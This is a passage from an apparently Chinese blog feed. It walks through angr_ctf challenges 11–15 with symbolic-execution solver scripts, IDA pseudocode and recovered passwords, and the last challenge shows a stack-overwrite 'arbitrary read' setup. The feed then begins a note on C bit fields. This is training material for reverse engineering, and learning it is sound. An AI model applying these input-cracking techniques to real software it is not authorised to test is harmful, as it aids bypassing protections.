class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, scanf0_address, scanf1_address</span>):</span></span><br><span class="line">            scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">            scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">            self.state.memory.store(scanf0_address, scanf0, endness = project.arch.memory_endness)</span><br><span class="line">            self.state.memory.store(scanf1_address, scanf1, endness = project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">            self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>] = (scanf0, scanf1)</span><br><span class="line"></span><br><span class="line">    scanf_symbol = <span class="string">&quot;__isoc99_scanf&quot;</span></span><br><span class="line"></span><br><span class="line">    project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find = is_successful, avoid = should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        stored_solutions = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>]</span><br><span class="line">        scanf0_solution = solution_state.solver.<span class="built_in">eval</span>(stored_solutions[<span class="number">0</span>], cast_to = <span class="built_in">bytes</span>)</span><br><span class="line">        scanf1_solution = solution_state.solver.<span class="built_in">eval</span>(stored_solutions[<span class="number">1</span>], cast_to = <span class="built_in">bytes</span>)</span><br><span class="line">        <span class="built_in">print</span>(scanf0_solution, scanf1_solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span>(Exception(<span class="string">&quot;Could not find the solution&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 11_angr_sim_scanf</span><br><span class="line">......</span><br><span class="line">1448564819 1398294103</span><br></pre></td></tr></table></figure><p>验证:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ ./11_angr_sim_scanf</span><br><span class="line">Enter the password: 1448564819 1398294103</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure><h5 id="12-angr-veritesting"><a href="#12-angr-veritesting" class="headerlink" title="12_angr_veritesting"></a>12_angr_veritesting</h5><blockquote><p>学习使用<code>Veritesting</code>的技术解决路径爆炸问题</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Veritesting</span><br><span class="line">- 结合静态符号执行和动态符号执行</span><br><span class="line">- 把限制式全部合并到一条路径上</span><br><span class="line">- 减少 path explosion 的影响</span><br><span class="line"></span><br><span class="line">project.factory.simgr(initial_state, veritesting=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>IDA打开, 其中这个循环会在二叉决策的时候导致路径爆炸</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = *((<span class="keyword">char</span> *)s + i + <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == complex_function(<span class="number">75</span>, i + <span class="number">93</span>) )</span><br><span class="line">    ++v15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="脚本-12"><a href="#脚本-12" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state, veritesting = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find = is_successful, avoid = should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span>(Exception(<span class="string">&quot;Could not find the solution&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 12_angr_veritesting</span><br><span class="line">......</span><br><span class="line"><span class="string">b&#x27;OQSUWYACEGIKMOQSUWYACEGIKMOQSUWY&#x27;</span></span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ ./12_angr_veritesting</span><br><span class="line">Enter the password: OQSUWYACEGIKMOQSUWYACEGIKMOQSUWY</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure><h5 id="13-angr-static-binary"><a href="#13-angr-static-binary" class="headerlink" title="13_angr_static_binary"></a>13_angr_static_binary</h5><blockquote><p>学习angr如何求解一个静态编译的程序</p></blockquote><p>第13题跟以往的题都不一样, 因为它是静态编译的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  13_angr_static_binary git:(master) ✗ file 13_angr_static_binary</span><br><span class="line">13_angr_static_binary:...., statically linked, .....</span><br></pre></td></tr></table></figure><ul><li>angr已经为我们提供了这些静态函数, 这里列举一些常用的函数</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;malloc&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;fopen&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;fclose&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;fwrite&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;getchar&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;strncmp&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;strcmp&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;scanf&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;printf&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;exit&#x27;]</span></span><br></pre></td></tr></table></figure><p>我们需要找到函数中使用静态函数的地址, 然后对其进行hook</p><h6 id="脚本-13"><a href="#脚本-13" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    project.hook(<span class="number">0x804ed40</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x804ed80</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x804f350</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x8048d10</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find = is_successful, avoid = should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span>(Exception(<span class="string">&quot;Could not find the solution&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 13_angr_static_binary</span><br><span class="line">......</span><br><span class="line">b<span class="string">&#x27;PNMXNMUD&#x27;</span></span><br></pre></td></tr></table></figure><p>验证:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ ./13_angr_static_binary</span><br><span class="line">Enter the password: PNMXNMUD</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure><p>去掉hook以后反正我是没跑出来……</p><h5 id="14-angr-shared-library"><a href="#14-angr-shared-library" class="headerlink" title="14_angr_shared_library"></a>14_angr_shared_library</h5><blockquote><p>这题主要学习如何分析不是典型程序的二进制文件</p></blockquote><p>IDA打开以后, 主函数如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  print_msg();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( validate((<span class="keyword">int</span>)&amp;s, <span class="number">8</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>validate()</code>是一个外部函数, 查看导入表即可知</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/angr14.jpg" alt="angr14"></p><p>接着我们打开题目所给<code>lib14_angr_shared_library.so</code>文件</p><p><code>validate()</code>伪C代码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">validate</span><span class="params">(<span class="keyword">char</span> *s1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    s2[i] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)s2 = <span class="number">0x474B4C57</span>;</span><br><span class="line">  v5 = <span class="number">0x48574A4C</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;s1[j];</span><br><span class="line">    *v3 = complex_function(s1[j], j);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(s1, s2) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>s1</code>是<code>password</code>, <code>a2</code>是字符串长度<code>8</code></p><p>那么我们直接对<code>lib</code>进行符号执行求解</p><ul><li>由于<code>shared library</code>使用的是跟地址无关的代码, 每次使用都是<code>基址+偏移</code>, 因此我们需要设定<code>基址</code>的值</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base = <span class="number">0x4000000</span></span><br><span class="line">  project = angr.Project(path_to_binary, load_options=&#123;</span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span> : &#123;</span><br><span class="line">      <span class="string">&#x27;custom_base_addr&#x27;</span> : base</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><ul><li><p>找到<code>validate()</code>函数的地址</p><p>直接使用<code>基址+偏移</code>的用法, 偏移可以直接在文件中获得</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000006D7 ; int __cdecl validate(char *s1, int)</span><br><span class="line">.text:000006D7                 public validate</span><br><span class="line">.text:000006D7 validate        proc near               ; DATA XREF: LOAD:00000250↑o</span><br><span class="line">.text:000006D7</span><br></pre></td></tr></table></figure><p>则<code>validate()</code>函数的地址为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">validate_function_address = base + <span class="number">0x6d7</span></span><br></pre></td></tr></table></figure><ul><li>创建一个<code>call_state</code></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buffer_pointer = claripy.BVV(<span class="number">0x3000000</span>, <span class="number">32</span>)</span><br><span class="line">initial_state = project.factory.call_state(validate_function_address, buffer_pointer, claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))</span><br></pre></td></tr></table></figure><p>其中, <code>buffer_pointer</code>主要用于存储我们的<code>password</code>, <code>claripy.BVV(8, 32)</code>则是该函数的另一个参数字符串长度</p><ul><li>接下来就是创建我们的符号向量, 并存储入<code>buff_pointer</code></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span> * <span class="number">8</span>)</span><br><span class="line">initial_state.memory.store(buffer_pointer, password)</span><br></pre></td></tr></table></figure><ul><li>接着创建求解器并设置需要找到的地址</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simgr = project.factory.simgr(initial_state)</span><br><span class="line">success_address = base + <span class="number">0x783</span></span><br><span class="line">simgr.explore(find=success_address)</span><br></pre></td></tr></table></figure><ul><li>添加约束条件并进行求解</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">  solution_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">  solution_state.add_constraints(solution_state.regs.eax != <span class="number">0</span>)</span><br><span class="line">  solution = solution_state.solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">  <span class="built_in">print</span>(solution)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></figure><h6 id="脚本-14"><a href="#脚本-14" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  base = <span class="number">0x4000000</span></span><br><span class="line">  project = angr.Project(path_to_binary, load_options=&#123;</span><br><span class="line">      <span class="string">&#x27;main_opts&#x27;</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;custom_base_addr&#x27;</span>: base</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  buffer_pointer = claripy.BVV(<span class="number">0x3000000</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">  validate_function_address = base + <span class="number">0x6d7</span></span><br><span class="line">  initial_state = project.factory.call_state(</span><br><span class="line">      validate_function_address, buffer_pointer, claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))</span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">  initial_state.memory.store(buffer_pointer, password)</span><br><span class="line"></span><br><span class="line">  simgr = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  success_address = base + <span class="number">0x783</span></span><br><span class="line">  simgr.explore(find=success_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simgr.found:</span><br><span class="line">    solution_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    solution_state.add_constraints(solution_state.regs.eax != <span class="number">0</span>)</span><br><span class="line">    solution = solution_state.solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  14_angr_shared_library git:(master) ✗ python3 s.py lib14_angr_shared_library.so</span><br><span class="line">......</span><br><span class="line">b<span class="string">&#x27;WWGNDMKG&#x27;</span></span><br></pre></td></tr></table></figure><p>验证, 直接运行会导致错误:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  14_angr_shared_library git:(master) ✗ ./14_angr_shared_library</span><br><span class="line">./14_angr_shared_library: error <span class="keyword">while</span> loading shared libraries: lib14_angr_shared_library.so: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><p>主要原因是这个程序找不到需要动态链接的这个库, 我们可以用如下命令进行解决:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LD_LIBRARY_PATH=. ./14_angr_shared_library</span><br></pre></td></tr></table></figure><p>其中<code>LD_LIBRARY_PATH=.</code>是告诉<code>14_angr_shared_library</code>在当前路径下寻找链接的动态库.</p><p>验证结果, 正确</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  14_angr_shared_library git:(master) ✗ LD_LIBRARY_PATH=. ./14_angr_shared_library</span><br><span class="line">placeholder</span><br><span class="line">Enter the password: WWGNDMKG</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure><h5 id="15-angr-arbitrary-read"><a href="#15-angr-arbitrary-read" class="headerlink" title="15_angr_arbitrary_read"></a>15_angr_arbitrary_read</h5><blockquote><p>该题学会如何任意读, 有点pwn的感觉</p></blockquote><p>IDA打开, 主逻辑很简单</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s = try_again;</span><br><span class="line">  print_msg();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %20s&quot;</span>, &amp;key, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">0x129B961</span> )</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(try_again);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的目的是最终输出<code>Good jobs</code></p><p>我们查看这里的栈布局:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000001C var_1C          db ?</span><br><span class="line">-0000001B                 db ? ; undefined</span><br><span class="line">-0000001A                 db ? ; undefined</span><br><span class="line">-00000019                 db ? ; undefined</span><br><span class="line">-00000018                 db ? ; undefined</span><br><span class="line">-00000017                 db ? ; undefined</span><br><span class="line">-00000016                 db ? ; undefined</span><br><span class="line">-00000015                 db ? ; undefined</span><br><span class="line">-00000014                 db ? ; undefined</span><br><span class="line">-00000013                 db ? ; undefined</span><br><span class="line">-00000012                 db ? ; undefined</span><br><span class="line">-00000011                 db ? ; undefined</span><br><span class="line">-00000010                 db ? ; undefined</span><br><span class="line">-0000000F                 db ? ; undefined</span><br><span class="line">-0000000E                 db ? ; undefined</span><br><span class="line">-0000000D                 db ? ; undefined</span><br><span class="line">-0000000C s               dd ?</span><br></pre></td></tr></table></figure><p>这里<code>var_1C</code>就是我们的<code>v4</code>, 很显然, 可输入的字符串刚刚好可以让我们覆盖到<code>s</code></p><p>这次我们仍然需要hook<code>scanf</code>函数, 只不过这次我们加入了限定条件, 限定为可见字符</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, param0, param1</span>):</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">32</span>) <span class="comment"># %u</span></span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">20</span>*<span class="number">8</span>) <span class="comment"># %20s</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 将scanf1这个bitVector, 按8位一组切分为list, 即切分成一个字节一个字节</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> scanf1.chop(bits=<span class="number">8</span>):</span><br><span class="line">      <span class="comment"># 添加约束条件, 约束每个字节的范围在&#x27;A&#x27;~&#x27;Z&#x27;中</span></span><br><span class="line">        self.state.add_constraints(char &gt;= <span class="string">&#x27;A&#x27;</span>, char &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">      scanf0_address = param0</span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      scanf1_address = param1</span><br><span class="line">      self.state.memory.store(scanf1_address, scanf1)</span><br><span class="line"></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>] = (scanf0, scanf1)</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tool </tag>
            
            <tag> angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 位域</title>
      <link href="/note-binary-C-bit-field/"/>
      <url>/note-binary-C-bit-field/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>转载自<a href="https://www.cnblogs.com/xd-elegant/p/4127365.html">https://www.cnblogs.com/xd-elegant/p/4127365.html</a>, 根据理解略有删减</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>有些信息在存储的时候, 并不需要占用一个完整的字节, 而只需要占几个或者一个二进制位。</p><p>例如, 在存放一个开关量的时候, 只有0和1两种状态, 用一位二进制位即可。</p><p>为了节省存储空间, 并使处理简便, C语言又提供了一种数据结构, 称为<code>位域</code>或者<code>位段</code></p><p>即把一个字节中的二进制位划分为不同的区域, 并说明每个区域的位数。</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>位域的定义结构如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> 位域结构名</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> 位域列表</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>位域结构名:每个位域结构都有一个名称使得程序在运行过程中通过名称来进行操作位域。</p></li><li><p>位域列表: <code>类型 位域名:位域长度</code></p></li></ul><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>位域变量的说明与结构变量说明的方式相同, 可采用先定义后说明, 同时定义说明或者直接说明这三种方式。例如</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bit_struct</span> &#123;</span></span><br><span class="line">    <span 